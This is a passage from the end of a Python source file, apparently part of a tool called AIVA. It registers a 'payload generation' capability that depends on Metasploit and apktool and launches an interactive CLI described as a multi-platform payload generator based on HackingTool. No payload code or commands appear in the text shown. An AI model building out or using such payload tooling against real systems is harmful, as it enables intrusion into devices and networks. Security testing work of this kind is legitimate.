        language=ProgrammingLanguage.PYTHON,
        entrypoint="PayloadManager",
        capability_type=CapabilityType.UTILITY,
        dependencies=["metasploit-framework", "apktool"],
        tags=["payload", "management", "orchestration"]
    )
    await registry.register_capability(manager_capability)
    
    LOGGER.info("載荷生成能力已註冊到系統")


# 主程序入口
async def main():
    """主程序"""
    console = Console()
    
    console.print(Panel.fit(
        "[bold magenta]AIVA 載荷生成模組[/bold magenta]\n"
        "基於 HackingTool 的多平台載荷生成工具",
        border_style=PAYLOAD_STYLE
    ))
    
    # 註冊能力
    await register_payload_capabilities()
    
    # 創建CLI並運行
    cli = PayloadCLI()
    await cli.run_interactive()


if __name__ == "__main__":
    asyncio.run(main())